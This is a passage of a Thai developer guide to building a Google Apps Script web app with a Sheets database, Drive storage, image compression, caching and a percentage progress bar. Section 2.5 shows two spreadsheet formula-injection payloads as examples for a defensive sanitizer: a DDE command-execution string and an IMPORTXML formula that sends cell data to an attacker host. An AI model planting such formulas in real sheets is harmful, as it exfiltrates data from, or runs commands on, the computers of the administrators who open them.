# 🚀 คู่มือสถาปัตยกรรม & เคล็ดลับการจัดการ Google Sheets + Drive พร้อมระบบ Progress Bar แบบ % (Production-Ready Guide)

> **วัตถุประสงค์ของเอกสารนี้:** รวบรวมเทคนิค สถาปัตยกรรม และโค้ดสำเร็จรูป (Copy-Paste Ready) จากโปรเจกต์นี้ เพื่อให้นำไปประยุกต์ใช้กับโปรเจกต์ใหม่ที่ใช้ Tech Stack แบบ **Frontend (HTML/JS/CSS) + Google Apps Script Web App (Backend) + Google Sheets (Database) + Google Drive (Storage)** ได้ทันทีโดยไม่ต้องเริ่มต้นนับหนึ่งใหม่

---

## 📑 สารบัญ (Table of Contents)
1. [ภาพรวมสถาปัตยกรรม (High-Level Architecture)](#1-ภาพรวมสถาปัตยกรรม-high-level-architecture)
2. [เคล็ดลับขั้นเทพในการจัดการข้อมูล (Data Management Secrets)](#2-เคล็ดลับขั้นเทพในการจัดการข้อมูล-data-management-secrets)
   - 2.1 [แก้ปัญหา CORS หลุดโลกด้วย Simple Request Hack](#21-แก้ปัญหา-cors-หลุดโลกด้วย-simple-request-hack)
   - 2.2 [เทคนิคบีบอัดภาพหน้าบ้านด้วย HTML5 Canvas ก่อนส่ง (Payload Saver)](#22-เทคนิคบีบอัดภาพหน้าบ้านด้วย-html5-canvas-ก่อนส่ง-payload-saver)
   - 2.3 [ทริคแยก Drive Upload ออกนอก LockService (Concurrency Maximizer)](#23-ทริคแยก-drive-upload-ออกนอก-lockservice-concurrency-maximizer)
   - 2.4 [การดึงภาพจาก Google Drive ด้วย Google CDN Thumbnail URL](#24-การดึงภาพจาก-google-drive-ด้วย-google-cdn-thumbnail-url)
   - 2.5 [ระบบความปลอดภัย: ป้องกัน Formula Injection ใน Google Sheets](#25-ระบบความปลอดภัย-ป้องกัน-formula-injection-ใน-google-sheets)
   - 2.6 [Multi-Layer Caching (SWR หน้าบ้าน + ScriptCache หลังบ้าน)](#26-multi-layer-caching-swr-หน้าบ้าน--scriptcache-หลังบ้าน)
   - 2.7 [Idempotent Database Setup (รันกี่ครั้งก็ไม่พัง)](#27-idempotent-database-setup-รันกี่ครั้งก็ไม่พัง)
3. [ระบบ Progress Loading Bar แบบแสดงเปอร์เซ็นต์จริง (%)](#3-ระบบ-progress-loading-bar-แบบแสดงเปอร์เซ็นต์จริง-)
   - 3.1 [ทำไม Progress Bar แบบ % ถึงสำคัญมากกับ Google Apps Script](#31-ทำไม-progress-bar-แบบ--ถึงสำคัญมากกับ-google-apps-script)
   - 3.2 [สถาปัตยกรรม Progress 2 ระดับในโปรเจกต์นี้](#32-สถาปัตยกรรม-progress-2-ระดับในโปรเจกต์นี้)
   - 3.3 [อัลกอริทึม Stage-Driven + Tweening Easing](#33-อัลกอริทึม-stage-driven--tweening-easing)
   - 3.4 [โค้ดพร้อมใช้: HTML + CSS + JS (Copy-Paste Ready)](#34-โค้ดพร้อมใช้-html--css--js-copy-paste-ready)
4. [โครงสร้างโค้ด Google Apps Script (Clean Modular Architecture)](#4-โครงสร้างโค้ด-google-apps-script-clean-modular-architecture)
5. [Checklist การนำไปใช้กับโปรเจกต์ใหม่ใน 15 นาที](#5-checklist-การนำไปใช้กับโปรเจกต์ใหม่ใน-15-นาที)

---

## 1. ภาพรวมสถาปัตยกรรม (High-Level Architecture)

```
[ Frontend Client: Browser ]
   │
   ├── 1. Client-Side Validation & Canvas Image Resizing (5MB -> 150KB)
   │
   ├── 2. UI Progress Manager (% Bar & Stepper Checklist อัปเดตสถานะ)
   │
   └── 3. Fetch POST (text/plain payload) ─────────┐
                                                    ▼
                                     [ Google Apps Script Web App ]
                                           (Router: doPost/doGet)
                                                    │
                      ┌─────────────────────────────┴────────────────────────────┐
                      ▼                                                          ▼
             [ Google Drive ]                                            [ Google Sheets ]
    (Upload ภาพนอก ScriptLock)                                     (Atomic appendRow ใน ScriptLock)
              │                                                                  │
              └─► คืนค่า Cover File ID & Thumbnail CDN URL ──────────────────────┘
```

ไฟล์อ้างอิงหลักในโปรเจกต์:
- หน้าบ้าน: [`assets/js/api.js`](file:///d:/Hongson-WebApp-Innovators/assets/js/api.js), [`assets/js/image-utils.js`](file:///d:/Hongson-WebApp-Innovators/assets/js/image-utils.js), [`assets/js/app.js`](file:///d:/Hongson-WebApp-Innovators/assets/js/app.js), [`assets/css/styles.css`](file:///d:/Hongson-WebApp-Innovators/assets/css/styles.css)
- หลังบ้าน: [`appscript/Code.gs`](file:///d:/Hongson-WebApp-Innovators/appscript/Code.gs), [`appscript/Drive.gs`](file:///d:/Hongson-WebApp-Innovators/appscript/Drive.gs), [`appscript/Sheets.gs`](file:///d:/Hongson-WebApp-Innovators/appscript/Sheets.gs), [`appscript/Submissions.gs`](file:///d:/Hongson-WebApp-Innovators/appscript/Submissions.gs), [`appscript/Utils.gs`](file:///d:/Hongson-WebApp-Innovators/appscript/Utils.gs)

---

## 2. เคล็ดลับขั้นเทพในการจัดการข้อมูล (Data Management Secrets)

### 2.1 แก้ปัญหา CORS หลุดโลกด้วย Simple Request Hack

#### ⚠️ ปัญหาคลาสสิกของ Google Apps Script
เมื่อส่งคำขอแบบ `POST` พร้อม `headers: { 'Content-Type': 'application/json' }` เบราว์เซอร์จะส่งคำขอ `OPTIONS` (Preflight Request) ไปตรวจสอบ CORS ก่อนเสมอ **แต่ Google Apps Script Web App ไม่รองรับ HTTP OPTIONS** ทำให้เกิดข้อผิดพลาด:
```text
Access to fetch at 'https://script.google.com/...' from origin '...' has been blocked by CORS policy.
```

#### ✅ วิธีแก้ที่ถูกต้องและเสถียรที่สุด 100%
เปลี่ยน Header เป็น **`text/plain;charset=utf-8`** ซึ่งจัดอยู่ในกลุ่ม **CORS Simple Request** เบราว์เซอร์จะไม่ส่ง Preflight `OPTIONS` เลย และอย่าลืมใส่ `redirect: 'follow'` เพราะ Google Apps Script จะ redirect (302) ไปยัง URL รันผลลัพธ์ของเซิร์ฟเวอร์

**โค้ดฝั่งหน้าบ้าน (`api.js`):**
```javascript
const response = await fetch(APP_CONFIG.API_URL, {
  method: 'POST',
  headers: { 'Content-Type': 'text/plain;charset=utf-8' }, // 💡 เคล็ดลับหัวใจหลัก
  body: JSON.stringify(payload), // แปลงข้อมูลเป็น JSON String ปกติ
  redirect: 'follow'             // 💡 บังคับให้ตาม Redirect ของ Google
});
const result = await response.json();
```

**โค้ดฝั่งหลังบ้าน Apps Script (`Code.gs`):**
```javascript
function doPost(e) {
  try {
    // อ่านข้อมูลจาก e.postData.contents ซึ่งเป็น plain text แล้ว parse เป็น JSON Object
    var payload = JSON.parse(e.postData.contents);
    var action = payload.action;

    // ประมวลผลตามคำสั่ง
    if (action === 'submitWork') {
      var data = Submissions.submit(payload);
      return Utils.buildSuccessResponse(data, 'บันทึกสำเร็จ');
    }
  } catch (err) {
    return Utils.buildErrorResponse('SERVER_ERROR', err.message);
  }
}
```

---

### 2.2 เทคนิคบีบอัดภาพหน้าบ้านด้วย HTML5 Canvas ก่อนส่ง (Payload Saver)

#### ⚠️ ปัญหา
- กล้องมือถือหรือไฟล์ภาพถ่ายหน้าจอมีขนาด **3MB - 12MB**
- Google Apps Script มีขีดจำกัดขนาด Payload และความเร็วในการแปลง Base64 ช้ามาก
- หากส่งภาพต้นฉบับ 5MB เข้าไป GAS จะใช้เวลาประมวลผลนานจนติด **Timeout 60 วินาที** ทันที

#### ✅ ทางออก: ย่อและแปลงไฟล์เป็น WebP บนเบราว์เซอร์ของผู้ใช้
ใช้โมดูล [`ImageUtils.processCoverImage`](file:///d:/Hongson-WebApp-Innovators/assets/js/image-utils.js):
1. ปรับขนาดภาพให้กว้าง/สูงไม่เกิน 1600x900px โดยคงอัตราส่วนเดิม (Aspect Ratio)
2. ปรับคุณภาพการบีบอัดเป็น `0.85` ในฟอร์แมต `image/webp` (หากเบราว์เซอร์เก่าไม่รองรับจะ fallback เป็น `image/jpeg`)
3. ตัด prefix `data:image/...;base64,` ออกเพื่อส่งเฉพาะข้อความ Base64 บริสุทธิ์
4. **ผลลัพธ์:** ขนาดไฟล์ลดลงจาก **5MB เหลือเพียง 120KB - 250KB (ลดลง 95%)** ใช้เวลาอัปโหลดเพียง 1-2 วินาที

**โค้ดตัวอย่างการบีบอัดภาพหน้าบ้าน:**
```javascript
async function processCoverImage(file) {
  const dataUrl = await readFileAsDataURL(file);

  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const maxWidth = 1600, maxHeight = 900;
      let { width, height } = img;

      if (width > maxWidth || height > maxHeight) {
        const ratio = Math.min(maxWidth / width, maxHeight / height);
        width = Math.round(width * ratio);
        height = Math.round(height * ratio);
      }

      const canvas = document.createElement('canvas');
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext('2d');
      ctx.imageSmoothingEnabled = true;
      ctx.imageSmoothingQuality = 'high';
      ctx.drawImage(img, 0, 0, width, height);

      let mime = 'image/webp';
      let outputDataUrl = canvas.toDataURL(mime, 0.85);
      if (!outputDataUrl.startsWith('data:image/webp')) {
        mime = 'image/jpeg';
        outputDataUrl = canvas.toDataURL(mime, 0.85);
      }

      const base64 = outputDataUrl.split(';base64,')[1];
      resolve({
        base64,
        mimeType: mime,
        name: file.name.replace(/\.[^/.]+$/, '') + (mime === 'image/webp' ? '.webp' : '.jpg')
      });
    };
    img.src = dataUrl;
  });
}
```

---

### 2.3 ทริคแยก Drive Upload ออกนอก LockService (Concurrency Maximizer)

นี่คือหนึ่งในความผิดพลาดที่พบบ่อยที่สุดในโปรเจกต์ Google Sheets + Drive:

```
❌ วิธีที่ผิด (ระบบค้างเมื่อมีคนส่งงานพร้อมกัน):
   LockService.waitLock(30000);
   DriveApp.createFile();       <-- ใช้เวลา 3-8 วินาที!! คนอื่นรอคิวจน Timeout
   sheet.appendRow();
   lock.releaseLock();
```

```
✅ วิธีที่ถูกต้องในโปรเจกต์นี้ ([Submissions.gs:77-120](file:///d:/Hongson-WebApp-Innovators/appscript/Submissions.gs#L77-L120)):
   1. อัปโหลดรูปขึ้น Google Drive ก่อน (ไม่มี Lock) -> ใครส่งพร้อมกันก็ทำคู่ขนานได้เลย
   2. ค่อยเรียก LockService เพื่อ appendRow ลง Google Sheets (ใช้เวลาเพียง 0.1-0.2 วินาที)
   3. ปล่อย Lock ทันที
   4. มี Orphan Rollback: หาก appendRow พัง ให้ลบรูปที่เพิ่งอัปโหลดใน Drive ทิ้งใน catch block!
```

**โค้ดตัวอย่างใน Apps Script:**
```javascript
var uploadedFileId = null;
try {
  // ขั้นที่ 1: อัปโหลดภาพไปยัง Google Drive (ทำนอก Lock เพื่อให้ขนานได้หลาย User พร้อมกัน)
  var coverInfo = Drive.uploadCoverImage(folderId, payload.coverBase64, payload.coverName, payload.coverMimeType);
  uploadedFileId = coverInfo.coverFileId;

  // ขั้นที่ 2: ล็อกเฉพาะช่วงเขียนแถวลง Sheet (ใช้เวลาเสี้ยววินาที)
  var lock = LockService.getScriptLock();
  try {
    lock.waitLock(30000);
    var sheet = Sheets.getSpreadsheet().getSheetByName('Submissions');
    sheet.appendRow([
      Utils.generateUUID(),
      payload.studentName,
      coverInfo.coverFileId,
      coverInfo.coverUrl,
      Utils.getIsoTimestamp()
    ]);
  } finally {
    lock.releaseLock(); // ปลดล็อกทันที
  }
} catch (e) {
  // Rollback: หากบันทึก Sheet ไม่สำเร็จ ให้ลบไฟล์ขยะใน Drive ทิ้งทันที
  if (uploadedFileId) {
    Drive.deleteFile(uploadedFileId);
  }
  throw e;
}
```

---

### 2.4 การดึงภาพจาก Google Drive ด้วย Google CDN Thumbnail URL

#### ⚠️ ปัญหา
หากใช้ `https://drive.google.com/uc?id={FILE_ID}` หรือ iframe Viewer จะโหลดช้า ติด Limit การเข้าถึงรูป และมักเกิดปัญหา Broken Image (รูปไม่ยอมแสดง) บนหน้าเว็บภายนอก เช่น GitHub Pages

#### ✅ เคล็ดลับ: ใช้ Google Drive Thumbnail CDN Format
ดูได้ใน [`appscript/Drive.gs:68`](file:///d:/Hongson-WebApp-Innovators/appscript/Drive.gs#L68):
```javascript
var coverUrl = 'https://drive.google.com/thumbnail?id=' + fileId + '&sz=w1600';
```
- ตั้งค่าการแชร์ไฟล์เป็น **`DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW`**
- URL นี้ดึงตรงจาก Cache Image Server ของ Google (โหลดไวมากแบบ CDN)
- พารามิเตอร์ `&sz=w1600` กำหนดให้แคชภาพที่ความกว้างสูงสุด 1600px ได้อย่างคมชัด หรือถ้าแสดงรูปเล็กๆ ในการ์ดสามารถเปลี่ยนเป็น `&sz=w600` ได้เพื่อโหลดไวเป็นพิเศษ

---

### 2.5 ระบบความปลอดภัย: ป้องกัน Formula Injection ใน Google Sheets

หากมีผู้ใช้ป้อนชื่อผลงานเป็น `=cmd|' /C calc'!A0` หรือ `=IMPORTXML("https://attacker.com/steal?data=" & A1, "//a")` ข้อมูลนี้อาจกลายเป็นโค้ดสั่งรันเมื่อผู้ดูแลระบบเปิดดูใน Excel หรือ Google Sheets!

ใน [`appscript/Utils.gs:26-36`](file:///d:/Hongson-WebApp-Innovators/appscript/Utils.gs#L26-L36) เราใช้ฟังก์ชัน Sanitizer:
```javascript
function sanitizeForSheet(value) {
  if (value === null || value === undefined) return '';
  var str = String(value).trim();
  if (str.length > 0) {
    var firstChar = str.charAt(0);
    // หากขึ้นต้นด้วยเครื่องหมายสูตร ให้ใส่ Single Quote นำหน้า
    if (firstChar === '=' || firstChar === '+' || firstChar === '-' || firstChar === '@') {
      return "'" + str;
    }
  }
  return str;
}
```

---

### 2.6 Multi-Layer Caching (SWR หน้าบ้าน + ScriptCache หลังบ้าน)

เพื่อให้เว็บโหลดได้ทันทีแบบ Instant แม้ Google Apps Script จะมี Cold Start:
1. **Server-Side Cache (`CacheService.getScriptCache()`):**
   - ใน [`Categories.gs`](file:///d:/Hongson-WebApp-Innovators/appscript/Categories.gs#L21-L79) นำข้อมูล Categories เก็บใน Server Cache นาน 5 นาที (`300s`)
   - ทำให้คำขอ GET ไม่ต้องไปวนอ่านแถวใน Sheet ซ้ำๆ ทุกรอบ
2. **Client-Side SWR (Stale-While-Revalidate) ด้วย `localStorage`:**
   - ใน [`api.js:321-338`](file:///d:/Hongson-WebApp-Innovators/assets/js/api.js#L321-L338) เมื่อเปิดเว็บ ระบบจะดึงข้อมูลเก่าจาก `localStorage` มาแสดงใน 0.05 วินาทีแรกทันที
   - จากนั้นยิง Background Request ไปดึงข้อมูลล่าสุดจาก Google Sheets มาอัปเดตแบบเงียบๆ

---

### 2.7 Idempotent Database Setup (รันกี่ครั้งก็ไม่พัง)

ใน [`appscript/Sheets.gs:29-86`](file:///d:/Hongson-WebApp-Innovators/appscript/Sheets.gs#L29-L86) มีฟังก์ชัน `setupDatabase()` ที่ตรวจสอบว่าตารางไหนยังไม่มีก็สร้างขึ้นมาพร้อม Header สวยงาม และถ้ามีอยู่แล้วก็จะไม่ไปลบข้อมูลเดิม ทำให้ผู้ดูแลระบบสามารถกด Deploy หรือสั่ง Setup ใหม่เมื่อไรก็ได้โดยข้อมูลไม่หาย

---

## 3. ระบบ Progress Loading Bar แบบแสดงเปอร์เซ็นต์จริง (%)

### 3.1 ทำไม Progress Bar แบบ % ถึงสำคัญมากกับ Google Apps Script

- Google Apps Script มีระยะเวลาประมวลผล **2 ถึง 6 วินาที** (Cold Start Container + Cloud Handshake)
- ถ้าใช้แค่ Spinner วงกลมหมุนๆ ผู้ใช้มักคิดว่าระบบค้าง จะกดปุ่ม Submit ซ้ำๆ หรือกดรีเฟรชหน้าเว็บ (F5) ทำให้เกิดข้อมูลซ้ำซ้อนหรือไฟล์เสีย
- **ผลลัพธ์ของการมี Progress Bar แบบ % และ Checklist:**
  - สร้างความมั่นใจให้ผู้ใช้งานรู้ว่าข้อมูลกำลังเดินทางไปถึงขั้นตอนไหน
  - บอกคำเตือนชัดเจนว่า *"ห้ามปิดหน้าต่างหรือกดรีเฟรช"*
  - ผู้ใช้ยอมรอได้นานขึ้นมากกว่า 10-15 วินาทีโดยไม่หงุดหงิด

---

### 3.2 สถาปัตยกรรม Progress 2 ระดับในโปรเจกต์นี้

โปรเจกต์นี้แบ่งการแจ้งเตือนโหลดออกเป็น 2 ระบบตาม Use Case:

| ระบบ | เลเยอร์ | การใช้งาน | หน้าตา UI |
|---|---|---|---|
| **1. Global Progress System** (`GlobalLoadingSystem`) | ชั้นบนสุดของจอ (Top Bar) + Sync Banner | การโหลดข้อมูลทั่วไป (GET), สลับหมวดหมู่, ล็อกอิน Admin | แถบสีนีออนวิ่งบนสุด + กล่องแจ้งเตือนข้อมูลคลาวด์ |
| **2. Submission Progress Overlay** (`SubmissionProgress`) | Modal Center Overlay | การส่งผลงานที่มีไฟล์ภาพ (POST + Drive Upload) | หน้าต่างป๊อปอัปบังหน้าจอ + จรวด Pulse + ตัวเลข % ขนาดใหญ่ + Checklist 5 ขั้นตอน |

---

### 3.3 อัลกอริทึม Stage-Driven + Tweening Easing

เนื่องจากการส่ง Request แบบ Simple POST ไปยัง Google Apps Script ไม่สามารถอ่าน Event `onprogress` ระดับ Byte ของเบราว์เซอร์ได้ (เพราะข้อจำกัดทางเทคนิคของ Google Redirect) เราจึงใช้ **เทคนิค Stage-Driven ควบคู่กับ Smooth Interpolation**:

```
[ Stage 1: Validation ] (0% ──► 15%)
    │ ตรวจสอบความถูกต้องของ Input ในฟอร์ม (เสร็จทันที)
    ▼
[ Stage 2: Compress Image ] (15% ──► 35%)
    │ ประมวลผลภาพบน Canvas (ใช้เวลา 200-400ms)
    ▼
[ Stage 3: Network Transmission & Drive Upload ] (35% ──► 65%)
    │ ส่งข้อมูลข้ามโครงข่ายไปยัง Google Drive
    ▼
[ Stage 4: Atomic Sheet Lock & Append ] (65% ──► 88%)
    │ Google Apps Script ทำการล็อกแถวและบันทึกข้อมูล
    │ (ช่วงรอ Network ให้ใช้ Tween Timer ขยับเปอร์เซ็นต์ทีละนิด เช่น 66%..70%..85%..88%)
    ▼
[ Stage 5: Done! ] (88% ──► 100%)
    │ เซิร์ฟเวอร์ตอบกลับ 200 OK -> ดีดตัวเลขขึ้น 100% ทันที -> สเต็ปเป็นเครื่องหมายถูก ✅ -> หน่วง 300ms แล้วปิดหน้าต่าง
```

---

### 3.4 โค้ดพร้อมใช้: HTML + CSS + JS (Copy-Paste Ready)

คุณสามารถก็อปปี้ส่วนประกอบ 3 ส่วนนี้ไปใส่ในโปรเจกต์ใหม่ได้เลยทันที:

#### 1) HTML Component (วางไว้ใน `<body>` หรือใน Modal)
```html
<!-- Submission Progress Overlay -->
<div id="submissionProgressOverlay" class="submission-progress-overlay hidden" role="dialog" aria-modal="true">
  <div class="submission-progress-box">
    <!-- Icon Animation -->
    <div class="submission-progress-rocket">
      <div class="rocket-icon-pulse">🚀</div>
      <div class="rocket-orbit-ring"></div>
    </div>
    
    <h3 id="submissionProgressTitle" class="submission-progress-title">กำลังส่งข้อมูลเข้าสู่ระบบ...</h3>
    <p id="submissionProgressSubtitle" class="submission-progress-subtitle">ระบบกำลังนำส่งไฟล์ไปยัง Google Drive และบันทึกลง Google Sheets</p>

    <!-- ตัวเลขเปอร์เซ็นต์ขนาดใหญ่สะดุดตา -->
    <div class="submission-percent-wrap">
      <span id="submissionPercentNumber" class="submission-percent-number">0</span>
      <span class="submission-percent-sign">%</span>
    </div>

    <!-- แถบ Progress Bar -->
    <div class="progress-bar-track submission-progress-track">
      <div id="submissionProgressBarFill" class="progress-bar-fill animated-stripes" style="width: 0%;"></div>
    </div>

    <!-- รายการขั้นตอน (Checklist Stepper) -->
    <div class="submission-steps-list">
      <div class="step-item" id="submitStep1">
        <span class="step-icon">📋</span>
        <span class="step-label">1. ตรวจสอบความถูกต้องของข้อมูล</span>
        <span class="step-status">⏳</span>
      </div>
      <div class="step-item" id="submitStep2">
        <span class="step-icon">🖼️</span>
        <span class="step-label">2. ประมวลผลและลดขนาดรูปภาพ</span>
        <span class="step-status">⏳</span>
      </div>
      <div class="step-item" id="submitStep3">
        <span class="step-icon">☁️</span>
        <span class="step-label">3. กำลังอัปโหลดไฟล์ขึ้น Google Drive</span>
        <span class="step-status">⏳</span>
      </div>
      <div class="step-item" id="submitStep4">
        <span class="step-icon">📊</span>
        <span class="step-label">4. กำลังบันทึกข้อมูลลง Google Sheets</span>
        <span class="step-status">⏳</span>
      </div>
      <div class="step-item" id="submitStep5">
        <span class="step-icon">✨</span>
        <span class="step-label">5. ตรวจสอบความสมบูรณ์และเสร็จสิ้น</span>
        <span class="step-status">⏳</span>
      </div>
    </div>

    <!-- ป้ายเตือนความปลอดภัย -->
    <div class="submission-warning-banner">
      <span class="warning-icon">⚠️</span>
      <div class="warning-text">
        <strong>กรุณารอสักครู่ ห้ามปิดหน้าต่างหรือกดรีเฟรชหน้าเว็บ (F5)</strong><br>
        ระบบกำลังเชื่อมต่อ Google Drive และ Google Sheets เพื่อความปลอดภัยของข้อมูล
      </div>
    </div>

    <!-- กล่องแจ้ง Error (ซ่อนไว้เป็นค่าเริ่มต้น) -->
    <div id="submissionProgressError" class="submission-error-box hidden">
      <p id="submissionProgressErrorMsg" class="submission-error-msg"></p>
      <button type="button" id="submissionRetryBtn" class="btn btn-primary">ลองใหม่อีกครั้ง</button>
    </div>
  </div>
</div>
```

---

#### 2) CSS Styling (ใส่ในไฟล์ CSS ของคุณ)
```css
/* Progress Overlay Backdrop */
.submission-progress-overlay {
  position: fixed;
  inset: 0;
  background: rgba(15, 23, 42, 0.85);
  backdrop-filter: blur(8px);
  z-index: 9999;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 1.25rem;
  transition: opacity 0.25s ease;
}

.submission-progress-overlay.hidden {
  display: none !important;
}

/* Card Box */
.submission-progress-box {
  background: #1e293b;
  border: 1px solid rgba(255, 255, 255, 0.12);
  border-radius: 1.25rem;
  padding: 2rem;
  max-width: 480px;
  width: 100%;
  text-align: center;
  color: #f8fafc;
  box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 30px rgba(56, 189, 248, 0.2);
}

/* Rocket Pulse */
.submission-progress-rocket {
  position: relative;
  width: 64px;
  height: 64px;
  margin: 0 auto 1rem;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 2rem;
  animation: rocket-float 2s ease-in-out infinite;
}

@keyframes rocket-float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-8px); }
}

/* Big Percentage Number */
.submission-percent-wrap {
  display: flex;
  align-items: baseline;
  justify-content: center;
  margin: 1rem 0;
  font-family: monospace;
  font-weight: 800;
  color: #38bdf8;
}

.submission-percent-number {
  font-size: 3rem;
  line-height: 1;
}

.submission-percent-sign {
  font-size: 1.5rem;
  margin-left: 0.25rem;
  color: #94a3b8;
}

/* Progress Track & Fill */
.submission-progress-track {
  width: 100%;
  height: 10px;
  background: #0f172a;
  border-radius: 9999px;
  overflow: hidden;
  margin-bottom: 1.5rem;
  border: 1px solid rgba(255, 255, 255, 0.08);
}

.progress-bar-fill {
  height: 100%;
  background: linear-gradient(90deg, #38bdf8, #818cf8, #c084fc);
  border-radius: 9999px;
  transition: width 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}

.progress-bar-fill.animated-stripes {
  background-image: linear-gradient(
    45deg,
    rgba(255, 255, 255, 0.15) 25%,
    transparent 25%,
    transparent 50%,
    rgba(255, 255, 255, 0.15) 50%,
    rgba(255, 255, 255, 0.15) 75%,
    transparent 75%,
    transparent
  );
  background-size: 1.25rem 1.25rem;
  animation: progress-stripes 1s linear infinite;
}

@keyframes progress-stripes {
  from { background-position: 1.25rem 0; }
  to { background-position: 0 0; }
}

/* Checklist Steps */
.submission-steps-list {
  text-align: left;
  background: #0f172a;
  border-radius: 0.75rem;
  padding: 1rem;
  margin-bottom: 1.25rem;
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.step-item {
  display: flex;
  align-items: center;
  font-size: 0.875rem;
  color: #64748b;
  transition: all 0.2s;
}

.step-item.is-active {
  color: #38bdf8;
  font-weight: 600;
}

.step-item.is-completed {
  color: #4ade80;
}

.step-icon { margin-right: 0.5rem; }
.step-label { flex: 1; }
.step-status { font-size: 0.9rem; }

/* Warning Banner */
.submission-warning-banner {
  background: rgba(234, 179, 8, 0.1);
  border: 1px solid rgba(234, 179, 8, 0.3);
  border-radius: 0.5rem;
  padding: 0.75rem;
  display: flex;
  align-items: center;
  gap: 0.75rem;
  text-align: left;
  font-size: 0.75rem;
  color: #fde047;
}

.warning-icon { font-size: 1.25rem; }

/* Error Box */
.submission-error-box {
  margin-top: 1rem;
  background: rgba(239, 68, 68, 0.15);
  border: 1px solid rgba(239, 68, 68, 0.4);
  padding: 1rem;
  border-radius: 0.5rem;
}
.submission-error-msg {
  color: #fca5a5;
  font-size: 0.875rem;
  margin-bottom: 0.75rem;
}
```

---

#### 3) JavaScript Controller (`progress-controller.js`)
```javascript
/**
 * Controller สำหรับควบคุม Progress Bar และ Stepper Checklist
 */
const SubmissionProgress = {
  overlay: null,
  percentEl: null,
  fillEl: null,
  subtitleEl: null,
  errorBox: null,
  errorMsg: null,
  retryBtn: null,
  currentPercent: 0,
  tweenTimer: null,

  init() {
    this.overlay = document.getElementById('submissionProgressOverlay');
    this.percentEl = document.getElementById('submissionPercentNumber');
    this.fillEl = document.getElementById('submissionProgressBarFill');
    this.subtitleEl = document.getElementById('submissionProgressSubtitle');
    this.errorBox = document.getElementById('submissionProgressError');
    this.errorMsg = document.getElementById('submissionProgressErrorMsg');
    this.retryBtn = document.getElementById('submissionRetryBtn');
  },

  start() {
    if (!this.overlay) this.init();
    if (!this.overlay) return;

    this.currentPercent = 0;
    this.setPercent(5);
    this.overlay.classList.remove('hidden');
    if (this.errorBox) this.errorBox.classList.add('hidden');

    // รีเซ็ตสถานะขั้นตอนทั้งหมดเป็นนาฬิกาทราย ⏳
    for (let i = 1; i <= 5; i++) {
      const step = document.getElementById('submitStep' + i);
      if (step) {
        step.className = 'step-item';
        const status = step.querySelector('.step-status');
        if (status) status.textContent = '⏳';
      }
    }

    this.setStep(1, 15, 'กำลังตรวจสอบความถูกต้องของข้อมูล...');
  },

  setStep(stepIndex, targetPercent, text) {
    if (this.subtitleEl) this.subtitleEl.textContent = text;
    this.animateToPercent(targetPercent);

    for (let i = 1; i <= 5; i++) {
      const step = document.getElementById('submitStep' + i);
      if (!step) continue;
      const status = step.querySelector('.step-status');

      if (i < stepIndex) {
        step.className = 'step-item is-completed';
        if (status) status.textContent = '✅';
      } else if (i === stepIndex) {
        step.className = 'step-item is-active';
        if (status) status.textContent = '🔄';
      } else {
        step.className = 'step-item';
        if (status) status.textContent = '⏳';
      }
    }
  },

  animateToPercent(target) {
    clearInterval(this.tweenTimer);
    target = Math.min(100, Math.max(0, target));

    this.tweenTimer = setInterval(() => {
      if (this.currentPercent < target) {
        this.currentPercent = Math.min(target, this.currentPercent + 2);
        this.setPercent(this.currentPercent);
      } else {
        clearInterval(this.tweenTimer);
      }
    }, 25);
  },

  setPercent(val) {
    this.currentPercent = val;
    if (this.percentEl) this.percentEl.textContent = val;
    if (this.fillEl) this.fillEl.style.width = `${val}%`;
  },

  complete(msg, callback) {
    this.setStep(5, 100, msg || 'ดำเนินการสำเร็จเรียบร้อยแล้ว!');
    setTimeout(() => {
      if (this.overlay) this.overlay.classList.add('hidden');
      if (typeof callback === 'function') callback();
    }, 600);
  },

  error(msg, retryCallback) {
    clearInterval(this.tweenTimer);
    if (this.subtitleEl) this.subtitleEl.textContent = 'เกิดข้อผิดพลาดในการนำส่งข้อมูล';
    if (this.errorBox) {
      this.errorBox.classList.remove('hidden');
      if (this.errorMsg) this.errorMsg.textContent = msg;
      if (this.retryBtn) {
        this.retryBtn.onclick = () => {
          this.errorBox.classList.add('hidden');
          if (typeof retryCallback === 'function') retryCallback();
        };
      }
    }
  },

  reset() {
    clearInterval(this.tweenTimer);
    this.currentPercent = 0;
    if (this.overlay) this.overlay.classList.add('hidden');
  }
};
```

---

#### 4) วิธีเรียกใช้งานตอนส่งฟอร์ม (Form Submission Flow)
```javascript
async function handleSubmit(event) {
  event.preventDefault();

  // 1. เริ่มต้นแสดง Progress Bar (Step 1: Validation)
  SubmissionProgress.start();

  try {
    const file = document.getElementById('imageInput').files[0];
    
    // 2. Step 2: ประมวลผลและลดขนาดภาพ (Canvas Compression)
    SubmissionProgress.setStep(2, 35, 'กำลังประมวลผลและลดขนาดภาพ...');
    const processedImage = await processCoverImage(file);

    // 3. เตรียมข้อมูล Payload
    const payload = {
      action: 'submitWork',
      studentName: document.getElementById('nameInput').value,
      coverBase64: processedImage.base64,
      coverName: processedImage.name,
      coverMimeType: processedImage.mimeType
    };

    // 4. Step 3 & 4: ส่งข้อมูลไปยังเซิร์ฟเวอร์
    SubmissionProgress.setStep(3, 60, 'กำลังอัปโหลดไฟล์ภาพไปยัง Google Drive...');
    
    // ตั้ง Timer ปล่อยเปอร์เซ็นต์ไหลไปเรื่อยๆ ระหว่างรอ Google Apps Script บันทึก Sheet
    const smoothTimer = setInterval(() => {
      if (SubmissionProgress.currentPercent < 88) {
        SubmissionProgress.setPercent(SubmissionProgress.currentPercent + 2);
      } else {
        clearInterval(smoothTimer);
        SubmissionProgress.setStep(4, 88, 'กำลังบันทึกข้อมูลลง Google Sheets...');
      }
    }, 200);

    // ยิงคำขอ POST
    const res = await fetch('YOUR_APPS_SCRIPT_URL', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
      body: JSON.stringify(payload),
      redirect: 'follow'
    });
    
    clearInterval(smoothTimer);
    const data = await res.json();

    if (data.success) {
      // 5. Step 5: สำเร็จ 100%
